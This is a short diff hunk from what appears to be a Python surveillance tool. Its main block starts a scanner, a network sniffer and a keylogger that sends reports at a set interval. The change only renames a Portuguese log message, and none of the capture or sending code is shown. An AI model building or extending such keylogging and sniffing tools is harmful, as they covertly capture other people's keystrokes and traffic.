@@ -253,7 +253,7 @@ if __name__ == "__main__":
     Scanner().start()
     logging("Iniciou do sniffer!")
     Sniffer().start()
-    logging("Termino do Scanner do programa!")
+    logging("Iniciou do KeyLogger!")
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
 
